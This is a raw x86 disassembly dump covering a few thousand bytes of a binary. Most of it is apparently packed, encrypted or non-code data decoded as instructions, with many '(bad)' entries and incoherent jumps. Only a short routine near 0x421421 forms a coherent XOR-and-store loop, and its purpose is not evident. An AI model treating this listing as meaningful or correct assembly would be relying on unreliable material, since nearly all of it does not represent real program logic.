  421144:	imul   ebp,DWORD PTR [esi-0x1413fb9e],0xf9add7d3
  42114e:	shr    BYTE PTR [ebx+0x36],0x37
  421152:	adc    ebx,DWORD PTR [ebp+0xafee441]
  421158:	sbb    bh,BYTE PTR gs:[ebx-0x6b]
  42115c:	push   ebp
  42115d:	jb     0x4210f4
  42115f:	dec    edi
  421160:	cs push 0x7f4fba88
  421166:	dec    ecx
  421167:	ficomp DWORD PTR [eax]
  421169:	inc    ebp
  42116a:	js     0x4211ca
  42116c:	fldenv [esi+0x1]
  42116f:	or     eax,0xe08bf037
  421174:	in     al,dx
  421175:	fidiv  WORD PTR [esi-0x34373658]
  42117b:	in     al,0x68
  42117d:	jmp    0x421157
  42117f:	lods   al,BYTE PTR ds:[esi]
  421180:	fwait
  421181:	ret    0xc02a
  421184:	je     0x421153
  421186:	outs   dx,DWORD PTR ds:[esi]
  421187:	arpl   WORD PTR [ebp+eax*2+0xc],bp
  42118b:	repnz mov WORD PTR [ecx],ds
  42118e:	xor    ch,ah
  421190:	cld    
  421191:	sub    DWORD PTR [eax+edx*2+0x53],edi
  421195:	(bad)  
  421197:	ret    0x173c
  42119a:	mov    DWORD PTR [ebx],eax
  42119c:	mov    eax,DWORD PTR [ebx+0x3e]
  42119f:	push   es
  4211a0:	cmc    
  4211a1:	sub    ch,ch
  4211a3:	sti    
  4211a4:	fstp   DWORD PTR [eax]
  4211a6:	jmp    0x421152
  4211a8:	sub    DWORD PTR [edx+0x693c7dc6],ecx
  4211ae:	sbb    BYTE PTR es:[esi],cl
  4211b1:	add    esp,DWORD PTR [eax+0x7562d9c0]
  4211b7:	xor    DWORD PTR [edx],0x71d15a58
  4211bd:	fcom   st(7)
  4211bf:	mov    ds:0x88b4f178,al
  4211c4:	stos   DWORD PTR es:[edi],eax
  4211c5:	jmp    0x14fa:0x1e5d01aa
  4211cc:	in     al,0x18
  4211ce:	adc    ah,0xe4
  4211d1:	adc    DWORD PTR ds:0x46261289,ebp
  4211d7:	outs   dx,BYTE PTR ds:[esi]
  4211d8:	push   eax
  4211d9:	ret    0x7dcd
  4211dc:	inc    ebp
  4211dd:	mov    edx,0xc704530e
  4211e2:	fcomp  st(5)
  4211e4:	xlat   BYTE PTR ds:[ebx]
  4211e5:	xchg   bl,dh
  4211e7:	mov    ebx,0x9b03cac7
  4211ec:	add    al,0x41
  4211ee:	fisttp DWORD PTR [edi-0x4c]
  4211f1:	ja     0x4211b0
  4211f3:	xchg   ebp,eax
  4211f4:	xchg   esp,eax
  4211f5:	sub    BYTE PTR [ecx+0x35],cl
  4211f8:	add    BYTE PTR [ecx+0x5484af83],ah
  4211fe:	xor    eax,0x7e758f0b
  421203:	dec    eax
  421204:	pop    es
  421205:	scas   ax,WORD PTR es:[edi]
  421207:	popa   
  421208:	not    BYTE PTR [ecx-0x155b30cf]
  42120e:	pop    ecx
  42120f:	fsubrp st(4),st
  421211:	mov    ecx,0xed96a307
  421216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421217:	adc    ah,BYTE PTR ds:0xe811c62c
  42121d:	xchg   DWORD PTR ds:0x62bcb2da,ebx
  421223:	cmp    al,0xe6
  421225:	(bad)  
  421226:	adc    ah,bh
  421228:	push   ecx
  421229:	sar    DWORD PTR ss:[ecx],1
  42122c:	xchg   ebx,eax
  42122d:	fistp  QWORD PTR [esi-0x3f6e9b7a]
  421233:	mov    DWORD PTR [ebx+edi*4+0x2f8bb59a],0xfde8a23c
  42123e:	mov    eax,DWORD PTR [ebp-0x3ddc5b4f]
  421244:	xor    ch,BYTE PTR [eax]
  421246:	stos   DWORD PTR es:[edi],eax
  421247:	(bad)  
  421249:	loop   0x42125e
  42124b:	adc    edx,esp
  42124d:	mov    bh,0xfa
  42124f:	add    al,0xaf
  421251:	xlat   BYTE PTR ds:[ebx]
  421252:	lock in eax,dx
  421254:	push   ebp
  421255:	(bad)  
  421256:	(bad)  
  421257:	out    dx,eax
  421258:	daa    
  421259:	das    
  42125a:	push   ecx
  42125b:	out    0xdd,al
  42125d:	cli    
  42125e:	xor    bh,BYTE PTR [eax]
  421260:	retf   
  421261:	or     esi,0x263d81cb
  421267:	jecxz  0x42127b
  421269:	mov    ebp,DWORD PTR [ebx]
  42126b:	jmp    0xadfbefd5
  421270:	ds dec eax
  421272:	inc    ecx
  421273:	mov    edi,0xbb4dc0f1
  421278:	jo     0x421220
  42127a:	mov    esi,0xf73ab744
  42127f:	lods   al,BYTE PTR ds:[esi]
  421280:	adc    DWORD PTR [ebx-0x67],ecx
  421283:	dec    ebx
  421284:	jnp    0x4212b8
  421286:	loopne 0x421258
  421288:	pop    esi
  421289:	xchg   edx,eax
  42128a:	rcl    al,0x60
  42128d:	cmp    bh,al
  42128f:	ret    
  421290:	mov    al,dh
  421292:	outs   dx,BYTE PTR ds:[esi]
  421293:	jmp    DWORD PTR [edx+0x4ad21118]
  421299:	jp     0x421281
  42129b:	mov    ds:0x31d5a001,al
  4212a0:	adc    al,BYTE PTR ds:0xa93b8023
  4212a6:	cmp    eax,0x424e90a0
  4212ab:	xchg   esi,eax
  4212ac:	lea    edx,[eax+0xfc8af45]
  4212b2:	pop    ds
  4212b3:	pop    esi
  4212b4:	in     al,dx
  4212b5:	outs   dx,BYTE PTR ds:[esi]
  4212b6:	xchg   eax,ebx
  4212b8:	aas    
  4212b9:	mov    eax,ds:0xb54c3acd
  4212be:	call   0xaa09:0x42f99d09
  4212c5:	dec    ebx
  4212c6:	sub    edx,DWORD PTR [ebp-0x23]
  4212c9:	loopne 0x421323
  4212cb:	test   eax,0xe01ef689
  4212d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212d1:	xchg   edx,eax
  4212d2:	add    eax,0x3a0ae39c
  4212d7:	popf   
  4212d8:	mov    es,WORD PTR [ebp-0x571c5909]
  4212de:	sub    eax,0x8af3a430
  4212e3:	popa   
  4212e4:	push   0xfa08eca9
  4212e9:	fsubr  QWORD PTR [esi-0x9]
  4212ec:	enter  0xfb0b,0xc7
  4212f0:	pop    edi
  4212f1:	add    al,0xcb
  4212f3:	cmp    bh,BYTE PTR [bp+di+0x34]
  4212f7:	sbb    al,BYTE PTR [eax]
  4212f9:	(bad)  
  4212fa:	mov    ch,0x8b
  4212fc:	repz inc ebx
  4212fe:	push   eax
  4212ff:	sbb    DWORD PTR [ebp+0x3b5dfa93],0x33
  421306:	mov    ch,0x7b
  421308:	lds    ebp,FWORD PTR [edx+0x173bb59b]
  42130e:	inc    ebp
  42130f:	popa   
  421310:	(bad)  
  421311:	sub    eax,0xda507107
  421316:	jne    0x421353
  421318:	mov    esp,0xd82636a0
  42131d:	pushf  
  42131e:	fmul   DWORD PTR [edi+edi*8]
  421321:	pushf  
  421322:	enter  0x9202,0xd4
  421326:	cmp    BYTE PTR [ecx],cl
  421328:	cwde   
  421329:	sbb    dl,ch
  42132b:	cdq    
  42132c:	xor    al,0xf3
  42132e:	and    BYTE PTR [eax],bl
  421330:	mov    ds:0x4a876429,al
  421335:	das    
  421336:	scas   eax,DWORD PTR es:[edi]
  421337:	int    0x57
  421339:	and    al,0xe3
  42133b:	fwait
  42133c:	jmp    0xe85e:0x86fa6f21
  421343:	add    eax,DWORD PTR [ebx+0x4ef00d36]
  421349:	dec    ecx
  42134a:	mov    ecx,0x84714d31
  42134f:	icebp  
  421350:	mov    edx,DWORD PTR [eax]
  421352:	mov    gs,WORD PTR [esi+0x1a31ccfb]
  421358:	jno    0x4213b8
  42135a:	popf   
  42135b:	push   0xffffff8b
  42135d:	inc    esp
  42135e:	cmp    eax,0x67d66f5b
  421363:	popf   
  421364:	xor    eax,0x73bef8ea
  421369:	in     eax,dx
  42136a:	scas   al,BYTE PTR es:[edi]
  42136b:	nop
  42136c:	scas   al,BYTE PTR es:[edi]
  42136d:	out    dx,al
  42136e:	pop    edi
  42136f:	iret   
  421370:	push   edi
  421371:	sbb    eax,0x52729450
  421376:	push   ebx
  421377:	adc    al,BYTE PTR [ecx-0x472abac1]
  42137d:	jns    0x42135b
  42137f:	repnz push edx
  421381:	shl    bl,1
  421383:	in     al,dx
  421384:	fsub   DWORD PTR [ebp+esi*8+0xdebe8cf]
  42138b:	sar    BYTE PTR [ecx-0x68],1
  42138e:	mov    bl,0x10
  421390:	or     dl,0xa1
  421393:	mov    ebx,0x1e2da3ac
  421398:	cld    
  421399:	shr    ch,cl
  42139b:	gs inc esi
  42139d:	inc    ecx
  42139e:	mov    ds:0xa8d421bc,eax
  4213a3:	sahf   
  4213a4:	mov    ch,0xd6
  4213a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213a7:	and    eax,0xd27e7395
  4213ac:	sbb    dl,ah
  4213ae:	inc    ebp
  4213af:	leave  
  4213b0:	mov    esi,DWORD PTR [ebx+0x4c964ca1]
  4213b6:	push   edx
  4213b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b8:	lahf   
  4213b9:	jno    0x421373
  4213bb:	xor    al,BYTE PTR [esi+0x29]
  4213be:	jle    0x4213f5
  4213c0:	mov    edx,0xa96f6236
  4213c5:	(bad)  
  4213c6:	in     al,dx
  4213c7:	mov    ebp,0xfc0ebf77
  4213cc:	push   eax
  4213cd:	sbb    BYTE PTR [edi+0x7],0x19
  4213d1:	pop    ebp
  4213d2:	jo     0x421420
  4213d4:	push   edi
  4213d5:	and    ah,BYTE PTR [edx+0x6b]
  4213d8:	push   eax
  4213d9:	fwait
  4213da:	je     0x4213be
  4213dc:	into   
  4213dd:	cmp    BYTE PTR [esi-0x48],bh
  4213e0:	push   cs
  4213e1:	xor    al,0xe1
  4213e3:	adc    ebp,DWORD PTR [ecx-0x40]
  4213e6:	and    al,0x78
  4213e8:	and    DWORD PTR [ebx+0x4658377a],ecx
  4213ee:	xor    ch,al
  4213f0:	int3   
  4213f1:	iret   
  4213f2:	pop    edi
  4213f3:	cli    
  4213f4:	std    
  4213f5:	push   edx
  4213f6:	and    DWORD PTR [esi+0x32],esi
  4213f9:	stos   BYTE PTR es:[edi],al
  4213fa:	jge    0x42146e
  4213fc:	rol    BYTE PTR [edx-0x40],cl
  4213ff:	iret   
  421400:	outs   dx,BYTE PTR ds:[esi]
  421401:	stc    
  421402:	sub    al,0xed
  421404:	shl    DWORD PTR [edx-0x3],1
  421407:	dec    esp
  421408:	daa    
  421409:	mov    cl,BYTE PTR [esi-0x2e]
  42140c:	call   0x4dcdf55e
  421411:	or     BYTE PTR [ebx],dh
  421413:	enter  0xce03,0xf
  421417:	test   DWORD PTR [ebx-0x24],esp
  42141a:	(bad)  
  42141b:	(bad)  
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xb77188e2
  42147c:	push   esp
  42147d:	mov    edx,0x1cd77
  421482:	arpl   WORD PTR [eax],ax
  421484:	add    BYTE PTR [eax],al
  421486:	imul   DWORD PTR [edx+0x7a9fadd4]
  42148c:	jnp    0x421440
  42148e:	fwait
  42148f:	mov    ecx,0x148df316
  421494:	pop    esi
  421495:	sub    eax,0x93ee6dd8
  42149a:	mov    ?,WORD PTR [ebx+0x7fc0bd09]
  4214a0:	mov    dh,0xde
  4214a2:	popa   
  4214a3:	mov    ch,0x1a
  4214a5:	ds je  0x421517
  4214a8:	std    
  4214a9:	aad    0xdb
  4214ab:	xor    al,bh
  4214ad:	sti    
  4214ae:	dec    edi
  4214af:	shr    BYTE PTR [esi-0x7e],cl
  4214b2:	cmp    bh,bh
  4214b4:	xor    ebp,0x69
  4214b7:	(bad)  
  4214b8:	out    0x7b,al
  4214ba:	xlat   BYTE PTR ds:[ebx]
  4214bb:	(bad)  
  4214bd:	push   esp
  4214be:	jno    0x421474
  4214c0:	or     eax,DWORD PTR [edx+eiz*8+0x1a]
  4214c4:	cmp    BYTE PTR [ebx],ah
  4214c6:	sub    BYTE PTR [edx-0x66b4506c],dl
  4214cc:	or     DWORD PTR [eax-0x7dfd081],0x0
  4214d3:	fisubr WORD PTR [ecx-0x30]
  4214d6:	dec    esp
  4214d7:	and    BYTE PTR [ebx],bl
  4214d9:	xlat   BYTE PTR ds:[ebx]
  4214da:	mov    cl,0xd
  4214dc:	or     BYTE PTR [ebx+eiz*4+0x2a],dh
  4214e0:	sti    
  4214e1:	push   es
  4214e2:	fldcw  WORD PTR [ebp-0x59]
  4214e5:	sub    BYTE PTR [eax],al
  4214e7:	pop    ebx
  4214e8:	pop    esi
  4214e9:	add    BYTE PTR [eax],al
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x8c0b5787
  4214fe:	fcmove st,st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	arpl   WORD PTR [eax],ax
  421504:	add    BYTE PTR [eax],al
  421506:	cld    
  421507:	clc    
  421508:	fs jae 0x4214a9
  42150b:	dec    ebp
  42150c:	out    0xe9,eax
  42150e:	enter  0xaf05,0x83
  421512:	add    ecx,DWORD PTR [ecx-0xa]
  421515:	cmp    ch,al
  421517:	(bad)  
  421518:	and    bh,bh
  42151a:	adc    eax,0x3c1617a3
  42151f:	pop    esp
  421520:	aam    0xa9
  421522:	jmp    0xff57469d
  421527:	xor    cl,BYTE PTR [edx+0x75]
  42152a:	jg     0x42155b
  42152c:	pop    edx
  42152d:	inc    esp
  42152e:	push   edx
  42152f:	sbb    DWORD PTR [ebp-0x55ad9f85],0xffffffe3
  421536:	dec    ecx
  421537:	aas    
  421538:	and    DWORD PTR [edx+0xe],edx
  42153b:	inc    DWORD PTR [esi-0xf]
  42153e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42153f:	fistp  QWORD PTR [ecx+edx*2-0x2]
  421543:	outs   dx,DWORD PTR ds:[esi]
  421544:	std    
  421545:	out    0x91,al
  421547:	aaa    
  421548:	sub    esp,ebx
  42154a:	or     al,0x9e
  42154c:	xor    BYTE PTR [esi-0x399c82d9],0x3f
  421553:	sub    BYTE PTR [esi-0x4b56e608],ch
  421559:	push   edi
  42155a:	jns    0x421522
  42155c:	icebp  
  42155d:	gs test eax,0x266e3a93
  421563:	lock ins DWORD PTR es:[edi],dx
  421565:	stc    
  421566:	sub    DWORD PTR [esp+edx*1+0x0],esp
  42156d:	add    BYTE PTR [edi],bl
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x127656d],0x3d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	arpl   WORD PTR [eax],ax
  421584:	add    BYTE PTR [eax],al
  421586:	or     eax,0x30edad29
  42158b:	xchg   edx,eax
  42158c:	fcomi  st,st(4)
  42158e:	or     eax,0xc6064846
  421593:	xor    ecx,0xcd63d9e1
  421599:	add    al,0xd6
  42159b:	or     DWORD PTR [edx+0x1093f237],edi
  4215a1:	mov    al,ds:0x870e38c7
  4215a6:	icebp  
  4215a7:	es push 0xa6dd3a56
  4215ad:	ret    
  4215ae:	addr16 push eax
  4215b0:	sub    eax,0xd393cc26
  4215b5:	xor    al,0xb6
  4215b7:	cli    
  4215b8:	xor    ebp,0x61a0a815
  4215be:	out    dx,al
  4215bf:	add    cl,ch
  4215c1:	jecxz  0x42156d
  4215c3:	add    BYTE PTR [ecx+0x2f4da36f],al
  4215c9:	mov    ah,0x31
  4215cb:	xchg   edx,eax
  4215cc:	scas   eax,DWORD PTR es:[edi]
  4215cd:	retf   0xedef
  4215d0:	mov    eax,0xd7ed3d1c
  4215d5:	add    edi,DWORD PTR [edi]
  4215d7:	pop    edi
  4215d8:	mov    esi,edx
  4215da:	push   edx
  4215db:	call   FWORD PTR [edx]
  4215dd:	fisttp WORD PTR [eax-0x7a]
  4215e0:	sbb    esi,esp
  4215e2:	xor    eax,0xfc5f0059
  4215e7:	ret    
  4215e8:	outs   dx,DWORD PTR ds:[esi]
  4215e9:	add    BYTE PTR [eax],al
  4215eb:	add    BYTE PTR [eax],al
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	jg     0x4215ab
  4215fc:	cmp    BYTE PTR [ebp-0x60],dl
  4215ff:	into   
  421600:	add    DWORD PTR [eax],eax
  421602:	arpl   WORD PTR [eax],ax
  421604:	add    BYTE PTR [eax],al
  421606:	adc    dh,BYTE PTR [ebx-0x6b]
  421609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42160a:	iret   
  42160b:	and    eax,0x3af6fada
  421610:	out    0xbd,eax
  421612:	xchg   ebp,edx
  421614:	cmc    
  421615:	pushf  
  421616:	and    ebp,esi
  421618:	adc    edi,DWORD PTR [eax]
  42161a:	call   0x53a1ab3d
  42161f:	(bad)  
  421620:	mov    ebx,0x3e23c705
  421625:	adc    ebp,DWORD PTR [ecx]
  421627:	adc    DWORD PTR [esi-0x2aa7f103],edx
  42162d:	xor    BYTE PTR [ebx],ch
  42162f:	popa   
  421630:	imul   ebx,edx,0x44
  421633:	ins    BYTE PTR es:[edi],dx
  421634:	adc    bl,dh
  421636:	dec    ecx
  421637:	call   0xdb66a05f
  42163c:	jnp    0x4215cf
  42163e:	iret   
  42163f:	pop    ebx
  421640:	imul   edi,DWORD PTR [eax],0xf3543184
  421646:	inc    edx
  421647:	lea    ecx,[ebx+edx*1+0x1581d5ce]
  42164e:	add    BYTE PTR ss:[edi+0x10],0x8a
  421653:	(bad)  
  421654:	fdiv   DWORD PTR [esp+eax*4-0xd]
  421658:	ins    DWORD PTR es:[edi],dx
  421659:	push   edx
  42165a:	jne    0x42168f
  42165c:	aam    0xa8
  42165e:	popa   
  42165f:	rcr    DWORD PTR [eax],1
  421661:	push   ds
  421662:	stos   DWORD PTR es:[edi],eax
  421663:	jno    0x42168c
  421665:	int3   
  421666:	fs inc esp
  421668:	push   ebp
  421669:	add    BYTE PTR [eax],al
  42166b:	add    BYTE PTR [eax],al
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x390dbd4d,al
  42167e:	add    ecx,edi
  421680:	add    DWORD PTR [eax],eax
  421682:	arpl   WORD PTR [eax],ax
  421684:	add    BYTE PTR [eax],al
  421686:	xchg   esp,eax
  421687:	fst    QWORD PTR [edi+0x22dff48a]
  42168d:	lahf   
  42168e:	xchg   ebx,eax
  42168f:	xchg   esp,eax
  421690:	stos   DWORD PTR es:[edi],eax
  421691:	add    cl,al
  421693:	sti    
  421694:	pop    ebp
  421695:	stc    
  421696:	inc    edi
  421697:	popa   
  421698:	dec    edx
  421699:	inc    ebx
  42169a:	jl     0x4216da
  42169c:	lods   al,BYTE PTR ds:[esi]
  42169d:	lock das 
  42169f:	cmp    BYTE PTR [eax],dl
  4216a1:	in     al,0x6e
  4216a3:	inc    edx
  4216a4:	aad    0x5b
  4216a6:	push   ebx
  4216a7:	inc    edx
  4216a8:	mov    ebp,0x70e75699
  4216ad:	les    edx,FWORD PTR [eax]
  4216af:	xor    al,0x3f
  4216b1:	push   0xb3f8b816
  4216b6:	ds xchg edx,eax
  4216b8:	and    eax,0x68980a9
  4216bd:	scas   al,BYTE PTR es:[edi]
  4216be:	jb     0x4216b8
  4216c0:	inc    ebx
  4216c1:	jbe    0x42169e
  4216c3:	lock inc esi
  4216c5:	sub    eax,0x1c09938
  4216ca:	data16 jno 0x421723
  4216cd:	push   ds
  4216ce:	jb     0x42174c
  4216d0:	mov    al,0xfe
  4216d2:	adc    ebx,ebp
  4216d4:	sbb    al,0x6
  4216d6:	loopne 0x421704
  4216d8:	xchg   BYTE PTR [eax+ecx*4],ch
  4216db:	fadd   DWORD PTR ds:0xd4cb110c
  4216e1:	cmp    DWORD PTR [eax+edx*8-0xc7fdaef],esi
  4216e8:	bound  eax,QWORD PTR [eax]
  4216ea:	add    BYTE PTR [eax],al
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	(bad)  
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	iret   
  4216fb:	xchg   edx,eax
  4216fc:	cs repnz iretw 
  421700:	add    DWORD PTR [eax],eax
  421702:	arpl   WORD PTR [eax],ax
  421704:	add    BYTE PTR [eax],al
  421706:	push   0x910c30d1
  42170b:	adc    bh,BYTE PTR ds:0x7d0a4406
  421711:	out    0x48,eax
  421713:	iret   
  421714:	es lsl ecx,cx
  421718:	inc    eax
  421719:	pop    ds
  42171a:	mov    eax,0x68dd7320
  42171f:	in     al,0xb4
  421721:	out    0x71,eax
  421723:	bound  esp,QWORD PTR [eax]
  421725:	jle    0x421785
  421727:	rcl    DWORD PTR ds:0xc241f9ef,cl
  42172d:	dec    edi
  42172e:	call   0xd852:0x7ac0636e
  421735:	and    ecx,DWORD PTR [edx]
  421737:	ins    BYTE PTR es:[edi],dx
  421738:	adc    al,0x58
  42173a:	pop    edx
  42173b:	nop
  42173c:	dec    ecx
  42173d:	cmp    esp,DWORD PTR [edi+0x23]
  421740:	push   0xa464e4f0
  421745:	pushf  
  421746:	jbe    0x4216d7
  421748:	mov    edx,0x330b6dd2
  42174d:	mov    esi,0xb361e75d
  421752:	sbb    al,0xfc
  421754:	pop    edx
  421755:	and    cl,bh
  421757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421758:	imul   DWORD PTR [ebp-0x8365544]
  42175e:	in     al,0xd2
  421760:	pusha  
  421761:	into   
  421762:	aam    0xdf
  421764:	pusha  
  421765:	add    DWORD PTR [edi+0x4e],esp
  421768:	jle    0x42176a
  42176a:	add    BYTE PTR [eax],al
  42176c:	add    BYTE PTR [eax],al
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0x8e6a4e09
  42177b:	mov    al,0x82
  42177d:	mov    ecx,ecx
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	arpl   WORD PTR [eax],ax
  421784:	add    BYTE PTR [eax],al
  421786:	dec    edi
  421787:	mov    ah,0xec
  421789:	fcmovb st,st(6)
  42178b:	ds sti 
  42178d:	fst    QWORD PTR [esi+0x6a]
  421790:	or     al,0xfe
  421792:	pop    esi
  421793:	add    eax,0x142403a9
  421798:	iret   
  421799:	out    dx,eax
  42179a:	cmp    DWORD PTR ds:0x4788ac0e,ecx
  4217a0:	loopne 0x42173e
  4217a2:	sbb    bl,BYTE PTR [edx+0x3bb33d26]
  4217a8:	data16 cli 
  4217aa:	push   cs
  4217ab:	mov    bl,0x50
  4217ad:	scas   al,BYTE PTR es:[edi]
  4217ae:	aas    
  4217af:	sub    esi,0xffffff8e
  4217b2:	icebp  
  4217b3:	aad    0x85
  4217b5:	pusha  
  4217b6:	cs inc esp
  4217b8:	xlat   BYTE PTR ds:[ebx]
  4217b9:	(bad)  [ebx+ecx*4-0x608e2a7e]
  4217c0:	pop    esi
  4217c1:	lods   eax,DWORD PTR ds:[esi]
  4217c2:	or     eax,0xa77913f7
  4217c7:	in     al,dx
  4217c8:	mov    ebp,ebp
  4217ca:	pop    edi
  4217cb:	push   edi
  4217cc:	out    dx,al
  4217cd:	loop   0x4217a6
  4217cf:	imul   edi,ebx,0xffffff98
  4217d2:	mov    ecx,0xc4b2a5e0
  4217d7:	or     dh,BYTE PTR [ecx]
  4217d9:	mov    ebx,0xa097d73a
  4217de:	sub    esp,DWORD PTR [ebx+0x7d]
  4217e1:	sub    eax,0x8ce56fcd
  4217e6:	and    BYTE PTR [ebx-0x16],bh
  4217e9:	add    BYTE PTR [eax],al
  4217eb:	add    BYTE PTR [eax],al
  4217ed:	add    BYTE PTR [edx],dl
  4217ef:	mov    edx,0xe6f8c6d8
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	dec    ecx
  4217fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217fc:	std    
  4217fd:	dec    ebp
  4217fe:	mov    esp,0x630001e2
  421803:	add    BYTE PTR [eax],al
  421805:	add    BYTE PTR [esi+eiz*4-0x3a9dbddf],bl
  42180c:	in     al,0xf9
  42180e:	iret   
  42180f:	jae    0x421852
  421811:	mov    eax,0x9d691629
  421816:	pop    ss
  421817:	inc    esi
  421818:	push   es
  421819:	push   eax
  42181a:	pop    bp
  42181c:	and    DWORD PTR [ebx-0x28],0xe5e6bc5a
  421823:	aaa    
  421824:	hlt    
  421825:	add    edx,DWORD PTR [ebx]
  421827:	xchg   bh,ch
  421829:	pop    ss
  42182a:	lock sbb al,0x5c
  42182d:	dec    esp
  42182e:	shl    dl,cl
  421830:	adc    edi,ecx
  421832:	scas   eax,DWORD PTR es:[edi]
  421833:	push   ds
  421834:	stos   DWORD PTR es:[edi],eax
  421835:	stos   BYTE PTR es:[edi],al
  421836:	mov    al,0x21
  421838:	mov    cl,0x64
  42183a:	cmc    
  42183b:	call   0x7986:0xb4ca594
  421842:	or     BYTE PTR [eax+0x78],0x5e
  421846:	mov    ds:0xbabd3e50,al
  42184b:	mov    ah,0xb6
  42184d:	daa    
  42184e:	ja     0x42187b
  421850:	adc    ah,BYTE PTR [esi+ecx*2+0x61541cc3]
  421857:	outs   dx,BYTE PTR ds:[esi]
  421858:	add    al,0x4c
  42185a:	je     0x4217e1
  42185c:	jb     0x421817
  42185e:	cmp    BYTE PTR [ecx],cl
  421860:	cwde   
  421861:	xchg   BYTE PTR [eax-0x3da57c6a],ah
  421867:	iret   
  421868:	mov    edx,0x0
  42186d:	add    BYTE PTR [ecx+0x46],cl
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	aaa    
  42187b:	lods   eax,DWORD PTR ds:[esi]
  42187c:	sbb    al,0x3b
  42187e:	pop    ds
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [ebx+0x0],ah
  421884:	add    BYTE PTR [eax],al
  421886:	data16 xor BYTE PTR [edx-0x5be46c09],cl
  42188d:	xchg   esp,eax
  42188e:	sbb    DWORD PTR [esi+eax*8+0x12],eax
  421892:	mov    ebx,0xdd7a7e36
  421897:	fidiv  DWORD PTR ds:0x3afef022
  42189d:	outs   dx,BYTE PTR ds:[esi]
  42189e:	(bad)
  4218a1:	fidivr WORD PTR [edx-0x3346498c]
  4218a7:	or     al,bl
  4218a9:	inc    esp
  4218aa:	gs jle 0x42187a
  4218ad:	daa    
  4218ae:	pop    ds
  4218af:	dec    esp
  4218b0:	cmovp  ebp,esp
  4218b3:	add    eax,0x5f1cd232
  4218b8:	imul   BYTE PTR [ebp+0x47929dad]
  4218be:	jno    0x421930
  4218c0:	mov    DWORD PTR [esp+eax*2+0x33],0x96d9f5e3
  4218c8:	les    ebx,FWORD PTR [eax]
  4218ca:	in     eax,0x9e
  4218cc:	fdivr  DWORD PTR [edi]
  4218ce:	fs add eax,0x144ea1b3
  4218d4:	mov    eax,ds:0x12ac2e9d
  4218d9:	sbb    BYTE PTR [esi-0x566df1ed],al
  4218df:	mov    eax,ds:0x51589c5d
  4218e4:	mov    edi,0x786ef90b
  4218e9:	add    BYTE PTR [eax],al
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x7aaada72
  4218fc:	test   eax,0x1e38213
  421901:	add    BYTE PTR [ebx+0x0],ah
  421904:	add    BYTE PTR [eax],al
  421906:	jo     0x42188c
  421908:	cmp    DWORD PTR [esi],ecx
  42190a:	dec    edx
  42190b:	loope  0x42188f
  42190d:	add    eax,0xd232c07d
  421912:	enter  0xf89f,0x16
  421916:	nop
  421917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421918:	stos   DWORD PTR es:[edi],eax
  421919:	jge    0x421962
